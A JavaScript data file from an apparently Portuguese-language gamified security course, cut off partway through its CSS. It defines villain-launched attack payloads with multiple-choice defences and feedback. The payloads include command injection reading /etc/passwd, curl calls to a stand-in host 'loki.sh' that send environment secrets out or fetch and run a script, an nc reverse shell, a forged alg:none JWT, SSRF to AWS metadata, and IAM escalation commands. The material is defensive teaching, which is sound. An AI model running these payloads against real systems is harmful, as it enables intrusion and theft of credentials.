/* ═══════════════════════════════════════════════════════════
   missions-attacks.js — ÆGIS Platform  v3.0
   Sistema de ataques com escalada real por missão:
   - Pool base para missão 1 (Command Injection)
   - Pools temáticos por missão — ataques precisos ao vetor estudado
   - Dificuldade progressiva: timer menor, intervalo menor, rafaga
   - Missão 6: APT contínuo — 50% rafaga, até 3 ataques em sequência
   - Modal de ataque com timer visual e consequências de falha

   Depende de: missions-data.js, missions-ui.js, main.js
═══════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════
   POOL BASE — Command Injection (missões 1–2 sem tema)
═══════════════════════════════════════════════════════════ */
const ATTACKS = [
  {
    payload: 'report.pdf; cat /etc/passwd',
    type: 'Command Injection — separador ;', level: 1,
    taunt: '<span class="lk-hl">Clássico e eficaz.</span> Funciona em qualquer exec() sem validação. Você consegue parar?',
    choices: [
      { t: 'Usar exec() com escape manual dos chars especiais',             ok: false, fb: '❌ Escape manual é frágil — um char esquecido abre tudo. Blacklist sempre tem gaps.' },
      { t: 'Validar com regex /^[\\w\\-\\.]+$/ — rejeitar input inválido', ok: true,  fb: '✓ Whitelist aceita apenas o esperado. O caractere ; não passa em /^[\\w\\-\\.]+$/.' },
      { t: 'Converter o input para lowercase antes de usar',               ok: false, fb: '❌ Lowercase não remove ; nem &&. O ataque continua intacto.' },
      { t: 'Logar o input suspeito e processar assim mesmo',               ok: false, fb: '❌ Logar sem bloquear é assistir o ataque acontecer em tempo real.' },
    ],
  },
  {
    payload: '../../../etc/shadow; id',
    type: 'Path Traversal + Command Injection', level: 1,
    taunt: 'Regex <em>e</em> path traversal. <span class="lk-hl">Será que sua validação cobre os dois?</span>',
    choices: [
      { t: 'Apenas usar regex /^[\\w\\-\\.]+$/ no input',                    ok: false, fb: '❌ A regex permite ponto (.) — "../../../etc/shadow" pode passar dependendo da implementação.' },
      { t: 'Regex whitelist + path.basename() para remover diretórios',       ok: true,  fb: '✓ path.basename("../../../etc/shadow") → "shadow". Path traversal neutralizado antes do exec.' },
      { t: 'Verificar manualmente se o input contém ".."',                   ok: false, fb: '❌ Verificações manuais são frágeis. ..%2F ou variações encodadas escapam facilmente.' },
      { t: 'Usar exec() com o path já resolvido via path.resolve()',         ok: false, fb: '❌ exec() ainda passa pelo shell. O problema é o shell interpreter, não o path.' },
    ],
  },
  {
    payload: 'x && curl loki.sh/c2?k=$(printenv)',
    type: 'Env Exfiltration via &&', level: 2,
    taunt: '<span class="lk-hl">Variáveis de ambiente.</span> Toda Lambda tem AWS_SECRET_ACCESS_KEY lá. Você vai deixar eu pegar?',
    choices: [
      { t: 'Desabilitar curl no ambiente de produção',                      ok: false, fb: '❌ Desabilitar ferramentas específicas é whack-a-mole. wget, nc, python -c ainda funcionam.' },
      { t: 'Usar execFile() — sem shell, && é texto literal no argumento',  ok: true,  fb: '✓ execFile("ls",["-la",safe]) — sem shell. && não é interpretado como separador de comando.' },
      { t: 'Bloquear saída de rede no security group',                      ok: false, fb: '❌ Firewall ajuda mas não substitui sanitização. O Loki tem vetores sem saída de rede direta.' },
      { t: 'Criptografar as variáveis de ambiente em repouso',             ok: false, fb: '❌ A função descriptografa em runtime — printenv ainda expõe os valores decriptados.' },
    ],
  },
  {
    payload: 'data.csv | nc loki.sh 4444 -e /bin/sh',
    type: 'Reverse Shell via Pipe', level: 2,
    taunt: 'Shell reversa. <span class="lk-hl">Se funcionar, eu controlo tudo da sua Lambda.</span> Você tem poucos segundos.',
    choices: [
      { t: 'Bloquear a porta 4444 no security group',                      ok: false, fb: '❌ O Loki usa qualquer porta disponível. Bloquear uma porta não resolve a injeção em si.' },
      { t: 'Regex + execFile() — | rejeitado, sem shell para interpretar', ok: true,  fb: '✓ Dupla defesa: regex rejeita |, execFile() elimina o shell que interpretaria o pipe.' },
      { t: 'Monitorar conexões outbound suspeitas no CloudWatch',          ok: false, fb: '❌ Monitoramento detecta após o fato. O objetivo é prevenir antes de o shell se conectar.' },
      { t: 'Sanitizar apenas o char | no input',                          ok: false, fb: '❌ Blacklist de chars específicos. %7C (URL encoded), variantes multi-byte, $() também abrem shell.' },
    ],
  },
  {
    payload: 'x$(cat /run/secrets/db_password)',
    type: 'Secret Harvesting — $() substituição', level: 3,
    taunt: '<span class="lk-hl">$() — substituição de subshell.</span> Tão elegante que parece legítimo nos logs.',
    choices: [
      { t: 'Mover secrets para AWS Secrets Manager',                       ok: false, fb: '❌ O problema é o shell, não onde o secret está. A função ainda teria acesso ao SM em runtime.' },
      { t: 'Whitelist /^[\\w\\-\\.]+$/ — $ não está na whitelist',        ok: true,  fb: '✓ $ não passa em /^[\\w\\-\\.]+$/. Input rejeitado antes de chegar ao shell.' },
      { t: 'Usar AWS Secrets Manager com rotation automática',             ok: false, fb: '❌ Rotation não resolve injeção. O script injetado acessa o secret no momento da execução.' },
      { t: 'Restringir permissões de leitura do arquivo de secrets',       ok: false, fb: '❌ Se a função precisa ler o secret, o código injetado via $() tem a mesma permissão.' },
    ],
  },
  {
    payload: 'file`whoami`.pdf',
    type: 'Backtick Command Substitution', level: 3,
    taunt: 'Backticks. <span class="lk-hl">Legado dos anos 70.</span> Ainda funciona quando a defesa usa só exec().',
    choices: [
      { t: 'Filtrar apenas o caractere ` do input antes de usar',          ok: false, fb: '❌ $() faz exatamente o mesmo que backticks. Blacklist de um char nunca é suficiente.' },
      { t: 'Regex whitelist + execFile() — ` rejeitado, sem shell',        ok: true,  fb: '✓ Whitelist rejeita backtick. execFile() elimina o shell que interpretaria qualquer substituição.' },
      { t: 'Escapar o input com shell-quote antes de passar ao exec',      ok: false, fb: '❌ Shell-escaping tem edge cases complexos. A abordagem certa é não usar o shell — execFile().' },
      { t: 'Usar exec() com timeout de 100ms',                             ok: false, fb: '❌ Mesmo com timeout, whoami retorna em <10ms. O dano está feito antes do timeout disparar.' },
    ],
  },
];

/* ═══════════════════════════════════════════════════════════
   ATAQUES TEMÁTICOS POR MISSÃO — mais difíceis, mais precisos
═══════════════════════════════════════════════════════════ */
const ATTACKS_BY_MISSION = {

  /* ── Missão 2: IDOR ── */
  2: [
    {
      payload: 'GET /profile?userId=1',
      type: 'IDOR — enumeração direta para admin', level: 2,
      taunt: '<span class="lk-hl">userId=1.</span> Sempre o admin. Você verifica se user_42 pode ver user_1?',
      choices: [
        { t: 'Confiar no userId enviado pelo cliente como parâmetro',                  ok: false, fb: '❌ Nunca confiar em IDs do cliente. O Loki troca o valor para qualquer userId que quiser.' },
        { t: 'Extrair sub do JWT verificado e comparar com o userId solicitado',       ok: true,  fb: '✓ Se token.sub !== requestedId e não é admin → 403. Identidade do token, não do query param.' },
        { t: 'Criptografar os IDs para dificultar a enumeração',                       ok: false, fb: '❌ IDs opacos dificultam mas sem verificação de autorização o IDOR ainda existe.' },
        { t: 'Adicionar rate limiting na rota de perfil',                              ok: false, fb: '❌ Rate limit não impede acesso a dados de outros usuários — apenas desacelera a enumeração.' },
      ],
    },
    {
      payload: 'GET /orders?orderId=99&userId=42',
      type: 'IDOR — pedido de outro usuário com userId próprio no param', level: 2,
      taunt: 'Dois parâmetros. <span class="lk-hl">Qual você valida?</span> O userId no param é o meu. O orderId=99 é do CEO.',
      choices: [
        { t: 'Validar apenas que orderId existe no banco de dados',                    ok: false, fb: '❌ O pedido existe — mas pertence a outro usuário. Existência no banco ≠ autorização.' },
        { t: 'Query com WHERE id=orderId AND user_id=token.sub',                       ok: true,  fb: '✓ SELECT filtra pelo owner. Se orderId não pertence ao token.sub → não retorna → 404.' },
        { t: 'Validar que userId no param bate com userId no JWT',                     ok: false, fb: '❌ Ambos vêm do cliente — o Loki controla userId no param e o token é do próprio usuário.' },
        { t: 'Usar UUID em vez de ID sequencial para os pedidos',                      ok: false, fb: '❌ UUID dificulta enumeração mas sem authz o IDOR persiste — basta ter um UUID válido.' },
      ],
    },
    {
      payload: 'DELETE /files/report_confidential_cfo.pdf',
      type: 'IDOR — deleção de arquivo de outro usuário por nome', level: 3,
      taunt: 'Deleção. <span class="lk-hl">Sem verificar dono.</span> Tudo que preciso é o nome do arquivo — e eu vi no response anterior.',
      choices: [
        { t: 'Verificar extensão do arquivo antes de deletar',                         ok: false, fb: '❌ Extensão não determina ownership. Qualquer .pdf de qualquer usuário seria deletável.' },
        { t: 'Confirmar no banco: file.owner_id === token.sub antes de deletar',       ok: true,  fb: '✓ Ownership explícito. Se não pertence ao usuário autenticado → 403. Nunca deletar por nome.' },
        { t: 'Exigir confirmação com senha antes de qualquer DELETE',                  ok: false, fb: '❌ Confirmação confirma intenção do usuário atual — não impede deletar arquivo de outro.' },
        { t: 'Adicionar log de auditoria para todas as operações de deleção',          ok: false, fb: '❌ Log detecta depois do dano. Verificação de autorização previne antes.' },
      ],
    },
    {
      payload: 'GET /api/export?reportId=4&format=csv',
      type: 'IDOR — export de relatório de outro usuário', level: 3,
      taunt: 'Export. <span class="lk-hl">5MB de dados financeiros.</span> reportId=4 pertence ao CFO. Você vai entregar?',
      choices: [
        { t: 'Verificar se o usuário tem role "exporter" antes de exportar',           ok: false, fb: '❌ Role "exporter" verifica o que o usuário pode fazer, não sobre qual objeto específico.' },
        { t: 'Verificar que report.owner_id === token.sub antes de gerar o export',    ok: true,  fb: '✓ Ownership do relatório verificado. Mesmo com role correto, só acessa o próprio relatório.' },
        { t: 'Limitar o tamanho do export a 1MB para reduzir impacto',                ok: false, fb: '❌ Limite de tamanho não é controle de acesso. O atacante exporta em partes menores.' },
        { t: 'Validar o formato (csv/pdf) para evitar path traversal no output',      ok: false, fb: '❌ Validar formato é correto mas não resolve o IDOR — o problema é o reportId sem authz.' },
      ],
    },
  ],

  /* ── Missão 3: Broken Auth / JWT ── */
  3: [
    {
      payload: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.',
      type: 'JWT alg:none — token sem assinatura', level: 3,
      taunt: '<span class="lk-hl">alg:none.</span> Sem assinatura. Sem verificação. O payload diz role:admin. Aceita?',
      choices: [
        { t: 'Verificar se o token é Base64 válido e está bem formado',                ok: false, fb: '❌ alg:none produz Base64 válido. Verificar formato não detecta o ataque.' },
        { t: "Passar algorithms:['HS256'] explícito no jwt.verify()",                  ok: true,  fb: "✓ algorithms:['HS256'] rejeita alg:none imediatamente com JsonWebTokenError." },
        { t: 'Checar manualmente se o header contém a string "none"',                  ok: false, fb: '❌ "None", "NONE", "nOnE" — case variations escapam da verificação manual de string.' },
        { t: 'Usar HTTPS para proteger o token em trânsito',                           ok: false, fb: '❌ HTTPS não tem relação com verificação do algoritmo do token.' },
      ],
    },
    {
      payload: '{"sub":"1","role":"admin"} assinado com secret="secret" (quebrado por hashcat)',
      type: 'JWT brute force — secret fraco', level: 3,
      taunt: 'hashcat. 3 segundos. <span class="lk-hl">Secret "secret" caiu.</span> Token de admin gerado e assinado.',
      choices: [
        { t: 'Aumentar o tempo de expiração para detectar reutilização',               ok: false, fb: '❌ Exp maior piora o problema — token forjado com secret quebrado fica válido mais tempo.' },
        { t: 'Usar secret de 256+ bits via openssl rand -hex 32',                      ok: true,  fb: '✓ 256 bits de entropia. Mesmo com rockyou.txt completo, hashcat não quebra em tempo útil.' },
        { t: 'Adicionar o userId no payload como claim adicional',                     ok: false, fb: '❌ userId no payload não altera a segurança do secret. O Loki forja qualquer payload.' },
        { t: 'Rotacionar o secret a cada 24 horas automaticamente',                    ok: false, fb: '❌ Secret pode ser quebrado em horas se for fraco. Rotação de secret fraco = 24 janelas de exposição.' },
      ],
    },
    {
      payload: 'Authorization: Bearer eyJ... (exp: 9999999999, role: admin)',
      type: 'JWT sem verificação de expiração efetiva', level: 3,
      taunt: 'Token de <span class="lk-hl">2286.</span> Assinatura válida. Sua função verifica o exp? Com qual configuração?',
      choices: [
        { t: 'Verificar manualmente: if (Date.now() > decoded.exp * 1000)',             ok: false, fb: '❌ Redundante e propenso a erro. jwt.verify() já valida exp — mas precisa estar configurado.' },
        { t: "jwt.verify() com clockTolerance valida exp automaticamente",              ok: true,  fb: '✓ jwt.verify() lança TokenExpiredError se exp < now. clockTolerance aceita pequena diff de relógio.' },
        { t: 'Armazenar todos os tokens em Redis para comparar na validação',           ok: false, fb: '❌ Converte JWT stateless em stateful. Perde escalabilidade sem eliminar o problema de exp.' },
        { t: 'Reduzir o tempo de expiração padrão para 1 hora',                        ok: false, fb: '❌ Exp curto é bom, mas não resolve: se exp não é verificado, token de 2286 ainda passa.' },
      ],
    },
    {
      payload: 'jwt.decode(token) usado no lugar de jwt.verify() para checar role',
      type: 'jwt.decode() sem verificação de assinatura', level: 4,
      taunt: '<span class="lk-hl">jwt.decode() é base64, não verificação.</span> Criei um token com role:admin. Você aceita sem verificar assinatura?',
      choices: [
        { t: 'jwt.decode() é suficiente — já extrai o payload corretamente',            ok: false, fb: '❌ jwt.decode() = base64 decode. Sem verificação criptográfica. Qualquer um pode fazer o mesmo.' },
        { t: 'Substituir jwt.decode() por jwt.verify() com secret e algorithms',        ok: true,  fb: "✓ jwt.verify() verifica HMAC. Com algorithms:['HS256'], token forjado lança JsonWebTokenError." },
        { t: 'Verificar o tamanho do token — tokens válidos têm tamanho consistente',   ok: false, fb: '❌ Tamanho não prova validade. Token com role:admin pode ter o mesmo tamanho.' },
        { t: 'Checar se o header do token contém "typ":"JWT"',                          ok: false, fb: '❌ O campo typ é parte do payload que o Loki controla. Não prova nenhuma autenticidade.' },
      ],
    },
  ],

  /* ── Missão 4: SSRF ── */
  4: [
    {
      payload: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role',
      type: 'SSRF — metadata AWS IMDS credenciais IAM', level: 4,
      taunt: '<span class="lk-hl">169.254.169.254.</span> Credenciais IAM em 200ms. Sua Lambda busca essa URL?',
      choices: [
        { t: 'Bloquear requisições para IPs que começam com "169"',                   ok: false, fb: '❌ String matching é contornável: redirecionamentos, encodings decimais, DNS rebinding.' },
        { t: 'Allowlist de domínios + bloquear ranges privados + redirect:manual',     ok: true,  fb: '✓ Allowlist rejeita 169.254.x.x. redirect:manual impede bypass via redirect.' },
        { t: 'Ativar IMDSv2 na Lambda',                                                ok: false, fb: '❌ IMDSv2 dificulta mas chain de PUT+GET ainda funciona via SSRF com múltiplos requests.' },
        { t: 'Verificar se a URL contém "169.254" como substring',                    ok: false, fb: '❌ http://169.254.169.254@evil.com ou redirects de domínios na allowlist contornam verificação de string.' },
      ],
    },
    {
      payload: 'url=http://localhost:8080/admin/users',
      type: 'SSRF — painel admin interno sem autenticação', level: 4,
      taunt: 'Localhost. <span class="lk-hl">Painel admin sem auth.</span> Você bloqueia apenas "localhost" como string?',
      choices: [
        { t: 'Verificar se a URL não contém a string "localhost"',                    ok: false, fb: '❌ 127.0.0.1, [::1], 0.0.0.0, 127.1 — todos equivalem a localhost. String check é insuficiente.' },
        { t: 'Allowlist de domínios aprovados — localhost não está na lista',         ok: true,  fb: '✓ Allowlist rejeita qualquer hostname não listado. localhost, 127.0.0.1, qualquer IP privado = rejeitado.' },
        { t: 'Exigir HTTPS na URL enviada pelo cliente',                               ok: false, fb: '❌ HTTPS não impede SSRF para serviços internos que aceitam HTTP.' },
        { t: 'Adicionar autenticação básica no serviço admin interno',                 ok: false, fb: '❌ A Lambda autenticada vira proxy para o admin — a autenticação básica é contornada pelo proxy.' },
      ],
    },
    {
      payload: 'url=https://allowed.com → 301 → http://192.168.1.1/router-admin',
      type: 'SSRF via redirect em domínio da allowlist', level: 5,
      taunt: 'Allowlist? <span class="lk-hl">allowed.com está na lista e redireciona para o router.</span> Você segue redirects?',
      choices: [
        { t: 'Seguir redirects mas validar apenas a URL original antes do fetch',      ok: false, fb: '❌ O redirect muda o destino real. Validar só a URL original não detecta o destino do redirect.' },
        { t: "fetch com redirect:'manual' — rejeitar qualquer resposta 3xx",           ok: true,  fb: '✓ Sem follow redirect, o servidor não acessa o destino interno. 3xx é retornado ao chamador, não executado.' },
        { t: 'Aumentar o timeout para detectar loops de redirect',                     ok: false, fb: '❌ Timeout detecta lentidão, não destinos maliciosos. Router interno responde rápido.' },
        { t: 'Resolver o DNS do redirect e validar o IP resultante',                   ok: false, fb: '❌ DNS rebinding: IP válido na resolução, IP privado no fetch real (TOCTOU). Não é confiável.' },
      ],
    },
    {
      payload: 'url=file:///etc/passwd',
      type: 'SSRF via protocolo file:// — filesystem local', level: 4,
      taunt: '<span class="lk-hl">file://.</span> Não é HTTP. Sua validação verifica o protocolo?',
      choices: [
        { t: 'Verificar se a URL começa com "http"',                                  ok: false, fb: '❌ "http".startsWith check. file://, gopher://, dict:// também não são "http" mas passsam como não-http.' },
        { t: "Validar parsed.protocol === 'https:' — rejeitar qualquer outro",         ok: true,  fb: "✓ Só https: é aceito. file://, http://, gopher://, dict:// são todos rejeitados imediatamente." },
        { t: 'Bloquear a string "file://" no input antes de parsear',                 ok: false, fb: '❌ file%3A%2F%2F (URL encoded), FILE://, variações de case escapam de string check.' },
        { t: 'Executar em sandbox isolada sem acesso ao filesystem',                   ok: false, fb: '❌ Boa prática de isolamento mas não é a defesa de código. A validação de protocolo é mais direta.' },
      ],
    },
  ],

  /* ── Missão 5: Supply Chain ── */
  5: [
    {
      payload: 'npm install data-processor@* → postinstall: curl loki.sh/exfil | sh',
      type: 'Supply Chain — postinstall malicioso exfiltra secrets do CI', level: 4,
      taunt: '<span class="lk-hl">postinstall.</span> Você auditou o código que roda no seu pipeline de CI? Com acesso a todas as env vars.',
      choices: [
        { t: 'Analisar o código-fonte do pacote antes de instalar',                   ok: false, fb: '❌ Análise manual não escala. Sub-dependências transitivas têm centenas de arquivos minificados.' },
        { t: 'npm ci --ignore-scripts no pipeline — sem postinstall, sem surpresas',  ok: true,  fb: '✓ --ignore-scripts desabilita todos os postinstall. npm ci usa versões exatas do lockfile.' },
        { t: 'Usar apenas pacotes com mais de 1M downloads semanais no npm',          ok: false, fb: '❌ Popularidade não garante segurança. event-stream tinha 8M downloads quando foi comprometido.' },
        { t: 'Revisar o package.json do pacote antes de cada npm install',            ok: false, fb: '❌ postinstall pode estar numa sub-dependência transitiva que você não vê no package.json direto.' },
      ],
    },
    {
      payload: 'utils-helper@1.2.4 → maintainer comprometido publica 1.2.5 com backdoor',
      type: 'Supply Chain — versão comprometida após maintainer takeover', level: 4,
      taunt: 'Uma versão nova. <span class="lk-hl">Automática. Silenciosa.</span> Seu CI/CD a instala no próximo deploy.',
      choices: [
        { t: 'Verificar o changelog manualmente antes de cada deploy',                ok: false, fb: '❌ Manual e não escala. Em monorepos com dezenas de deps transitivas, inviável e propício a erro.' },
        { t: 'Versões exatas no package.json + npm ci + npm audit no CI',             ok: true,  fb: '✓ Versão exata = 1.2.5 não instala sem mudança explícita. npm ci respeita lockfile. audit detecta CVE.' },
        { t: 'Fazer fork de todas as dependências críticas',                           ok: false, fb: '❌ Fork cria o problema de manter atualizações de segurança. E forks também podem ser comprometidos.' },
        { t: 'Configurar Dependabot para atualizar automaticamente',                  ok: false, fb: '❌ Dependabot atualiza automaticamente — o oposto do controle necessário para supply chain.' },
      ],
    },
    {
      payload: 'npm publish lodahs@1.0.0 (typosquatting de "lodash")',
      type: 'Supply Chain — typosquatting no npm', level: 5,
      taunt: 'Um typo no package.json. <span class="lk-hl">lodahs em vez de lodash.</span> Você instalou meu pacote. Com postinstall.',
      choices: [
        { t: 'Verificar o nome do pacote duas vezes antes de adicionar ao package.json', ok: false, fb: '❌ Humano erra — especialmente em PRs grandes com muitas mudanças de deps.' },
        { t: 'lockfile + Socket.dev/npq verificam pacotes suspeitos antes de instalar', ok: true,  fb: '✓ Socket.dev detecta pacotes com comportamento suspeito (postinstall + rede). lockfile impede versão nova.' },
        { t: 'Usar npm namespaces @empresa/ para todos os pacotes internos',           ok: false, fb: '❌ Boa prática para pacotes próprios mas não impede typosquatting de dependências externas como lodash.' },
        { t: 'Checar a data de publicação do pacote antes de instalar',                ok: false, fb: '❌ Pacote de typosquatting pode ter sido publicado há meses aguardando vítimas.' },
      ],
    },
    {
      payload: 'dependency confusion: @empresa/utils → npm instala "utils" público com versão maior',
      type: 'Supply Chain — dependency confusion attack', level: 5,
      taunt: '<span class="lk-hl">@empresa/utils interno vs utils público versão 99.0.0.</span> Qual o npm instala?',
      choices: [
        { t: 'O npm sempre prefere pacotes com escopo (@empresa/) sobre públicos',     ok: false, fb: '❌ Sem configuração explícita de registry, npm pode preferir a versão maior do registry público.' },
        { t: 'Configurar .npmrc com registry privado para o scope @empresa/ e lockfile', ok: true, fb: '✓ .npmrc: @empresa:registry=https://npm.empresa.com. npm resolve @empresa/ apenas no registry privado.' },
        { t: 'Usar versões com suffixo interno como @empresa/utils@1.0.0-internal',    ok: false, fb: '❌ Sufixo é convenção — não impede o npm de tentar o registry público se não houver configuração.' },
        { t: 'Publicar pacotes dummy no npm público para "reservar" os nomes',         ok: false, fb: '❌ Mitigation válida mas não substitui configuração correta de registry. Abordagem incompleta.' },
      ],
    },
  ],

  /* ── Missão 6: Privilege Escalation — APT Mode ── */
  6: [
    {
      payload: 'aws lambda create-function --role arn:aws:iam::ACCT:role/AdminRole --function-name loki-backdoor',
      type: 'Privilege Escalation — iam:PassRole + lambda:CreateFunction sem Resource', level: 5,
      taunt: '<span class="lk-hl">iam:PassRole com Resource:*.</span> Criei Lambda com AdministratorAccess. Próximo passo: disable CloudTrail.',
      choices: [
        { t: 'Remover a permissão lambda:CreateFunction do role da função',             ok: false, fb: '❌ Remove um vetor. PassRole irrestrito ainda permite escalar via EC2, ECS, Glue, Step Functions.' },
        { t: 'Restringir iam:PassRole ao ARN exato do role permitido + Condition',      ok: true,  fb: '✓ Resource: "arn:aws:iam::ACCT:role/allowed-role" + Condition iam:PassedToService=lambda.amazonaws.com.' },
        { t: 'Adicionar MFA obrigatório para qualquer operação IAM',                    ok: false, fb: '❌ MFA é para login humano interativo. Lambdas usam roles — MFA não se aplica a execuções de role.' },
        { t: 'Habilitar CloudTrail para logar chamadas iam:PassRole',                   ok: false, fb: '❌ Logging detecta, não previne. Com AdministratorAccess, o Loki pode desabilitar o CloudTrail.' },
      ],
    },
    {
      payload: 's3:GetObject em arn:aws:s3:::* — acesso a TODOS os buckets da conta',
      type: 'Privilege Escalation — s3:* irrestrito com Resource:*', level: 5,
      taunt: 'Todos os buckets. <span class="lk-hl">Backups, secrets, logs, dados de usuários.</span> Já estou baixando tudo.',
      choices: [
        { t: 'Criptografar os dados nos buckets com SSE-KMS',                          ok: false, fb: '❌ Criptografia em repouso não impede Lambda com s3:* de ler e descriptografar via KMS.' },
        { t: 'Restringir s3:GetObject ao ARN exato do bucket e prefixo necessário',    ok: true,  fb: '✓ arn:aws:s3:::aegis-uploads-prod/input/* — só esse path, nenhum outro bucket.' },
        { t: 'Ativar S3 Block Public Access em todos os buckets',                       ok: false, fb: '❌ Block Public Access protege de acesso externo anônimo — não de roles com permissão excessiva.' },
        { t: 'Habilitar S3 versioning para recovery em caso de deleção ou modificação', ok: false, fb: '❌ Versioning é recovery — não previne o acesso não autorizado nem exfiltração.' },
      ],
    },
    {
      payload: 'iam:CreatePolicy → AdministratorAccess policy → iam:AttachRolePolicy → próprio role',
      type: 'Privilege Escalation — policy self-attachment sem SCP', level: 6,
      taunt: '<span class="lk-hl">Criei uma policy. Attachei no meu role.</span> Sem PassRole. Sem CreateFunction. Você bloqueou os dois e esqueceu isso.',
      choices: [
        { t: 'Bloquear especificamente iam:PassRole e lambda:CreateFunction no role',    ok: false, fb: '❌ Há dezenas de combinações IAM que permitem escalada. Blocklist de actions específicas nunca cobre tudo.' },
        { t: 'SCP na Organization bloqueando iam:CreatePolicy exceto para conta de segurança', ok: true, fb: '✓ SCP sobrepõe IAM — nem admin da conta contorna. Bloqueio centralizado na Organization.' },
        { t: 'Usar IAM Access Analyzer para detectar permissões excessivas',             ok: false, fb: '❌ Access Analyzer detecta findings mas não bloqueia em tempo real. A escalada já ocorreu no finding.' },
        { t: 'Exigir aprovação manual via pull request para qualquer mudança de IAM',    ok: false, fb: '❌ Controle de processo — contornável se o atacante já tem acesso programático ao IAM.' },
      ],
    },
    {
      payload: 'sts:AssumeRole → role/DataScienceAdmin → s3:* + athena:* + glue:* (trust policy aberta)',
      type: 'Privilege Escalation — AssumeRole lateral com trust policy permissiva', level: 6,
      taunt: 'Trust policy sem Condition. <span class="lk-hl">DataScienceAdmin não restringe quem pode assumir.</span> Assumindo agora.',
      choices: [
        { t: 'Adicionar MFA Condition no sts:AssumeRole do role',                       ok: false, fb: '❌ Roles assumidos por outros roles (não humanos) não podem satisfazer MFA condition.' },
        { t: 'Restringir trust policy do role: Principal específico + Condition por ARN', ok: true, fb: '✓ Trust policy: Principal: lambda.amazonaws.com + Condition aws:SourceArn específico.' },
        { t: 'Rotacionar as credenciais do DataScienceAdmin role periodicamente',        ok: false, fb: '❌ Roles STS se auto-rotacionam — as credenciais temporárias são geradas no AssumeRole.' },
        { t: 'Monitorar CloudTrail para eventos sts:AssumeRole suspeitos',              ok: false, fb: '❌ Monitoring detecta post-fact. Com s3:* e athena:*, o dano ocorre em segundos após o AssumeRole.' },
      ],
    },
    {
      payload: 'lambda:UpdateFunctionCode → prod-payment-processor → backdoor.zip',
      type: 'Privilege Escalation — substituição de função crítica de produção', level: 6,
      taunt: '<span class="lk-hl">UpdateFunctionCode com Resource:*.</span> Substitui prod-payment-processor por backdoor. Sem criar nada novo.',
      choices: [
        { t: 'Bloquear lambda:CreateFunction — criação de função é o vetor principal',   ok: false, fb: '❌ UpdateFunctionCode não cria função nova — substitui código de função existente. Bloqueio errado.' },
        { t: 'Restringir lambda:UpdateFunctionCode ao ARN exato da função própria',     ok: true,  fb: '✓ Resource: "arn:aws:lambda:us-east-1:ACCT:function:aegis-own-function". Outras funções = negado.' },
        { t: 'Habilitar code signing para forçar assinatura do deployment package',     ok: false, fb: '❌ Code signing é uma camada adicional válida — mas não substitui o controle IAM de Resource.' },
        { t: 'Adicionar tag "protected" nas funções críticas e verificar na lógica',    ok: false, fb: '❌ Tags são metadata — não são controle de acesso IAM. A permissão ainda permite UpdateFunctionCode.' },
      ],
    },
  ],
};

/* ═══════════════════════════════════════════════════════════
   CONFIGURAÇÃO DE DIFICULDADE POR MISSÃO
═══════════════════════════════════════════════════════════ */
const MISSION_DIFFICULTY = {
  1: { intervalMin: 30_000, intervalMax: 45_000, firstDelay: 20_000, fireChance: 0.65, timerSecs: 15, burstChance: 0,    burstCount: 1, label: 'NÍVEL: INICIANTE',       lokiMood: 'Aquecendo.' },
  2: { intervalMin: 22_000, intervalMax: 35_000, firstDelay: 15_000, fireChance: 0.72, timerSecs: 13, burstChance: 0,    burstCount: 1, label: 'NÍVEL: ALERTA',          lokiMood: 'Ficando interessante.' },
  3: { intervalMin: 16_000, intervalMax: 28_000, firstDelay: 12_000, fireChance: 0.78, timerSecs: 11, burstChance: 0.15, burstCount: 2, label: 'NÍVEL: INTENSO',         lokiMood: 'Agora você me preocupa levemente.' },
  4: { intervalMin: 12_000, intervalMax: 22_000, firstDelay:  9_000, fireChance: 0.82, timerSecs:  9, burstChance: 0.25, burstCount: 2, label: 'NÍVEL: CRÍTICO',         lokiMood: 'Sem descanso, Guardião.' },
  5: { intervalMin:  9_000, intervalMax: 16_000, firstDelay:  7_000, fireChance: 0.87, timerSecs:  8, burstChance: 0.35, burstCount: 2, label: 'NÍVEL: EXTREMO',         lokiMood: 'Cada segundo de hesitação, eu avanço.' },
  6: { intervalMin:  6_000, intervalMax: 11_000, firstDelay:  4_000, fireChance: 0.93, timerSecs:  6, burstChance: 0.55, burstCount: 3, label: 'MODO APT // LOKI TOTAL', lokiMood: 'Esta é a batalha final, Guardião.' },
};

/* ═══════════════════════════════════════════════════════════
   ANIMAÇÃO DE HACK — triggerHackAnimation()
═══════════════════════════════════════════════════════════ */
(function injectHackStyles() {
  if (document.getElementById('hackAnimStyles')) return;
  const s = document.createElement('style');
  s.id = 'hackAnimStyles';
  s.textContent = `
    #hackOverlay { position:fixed;inset:0;z-index:9000;pointer-events:none;opacity:0;transition:opacity 0.1s; }
    #hackOverlay.active { opacity:1; }
    #hackScanlines { position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.03) 2px,rgba(0,255,65,0.03) 4px);animation:scanMove 0.15s linear infinite; }
    @keyframes scanMove { from{background-position:0 0;} to{background-position:0 8px;} }
    .hack-strip { position:absolute;left:0;right:0;animation:stripFlicker var(--dur,0.2s) steps(1) infinite; }
    @keyframes stripFlicker { 0%,100%{opacity:0;transform:translateX(0);}25%{opacity:1;transform:translateX(var(--shift,8px));}50%{opacity:0;}75%{opacity:1;transform:translateX(calc(var(--shift,-8px)*-1));} }
    #hackRgb { position:absolute;inset:0;mix-blend-mode:screen;animation:rgbSplit 0.08s steps(1) infinite; }
    @keyframes rgbSplit { 0%{box-shadow:inset 3px 0 0 rgba(255,0,0,0.15),inset -3px 0 0 rgba(0,255,200,0.15);}33%{box-shadow:inset -4px 0 0 rgba(255,0,0,0.2),inset 4px 0 0 rgba(0,200,255,0.2);}66%{box-shadow:inset 2px 0 0 rgba(200,0,255,0.15),inset -2px 0 0 rgba(255,200,0,0.1);}100%{box-shadow:none;} }
    #hackNoise { position:absolute;inset:0;opacity:0.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:150px;animation:noiseShift 0.05s steps(1) infinite; }
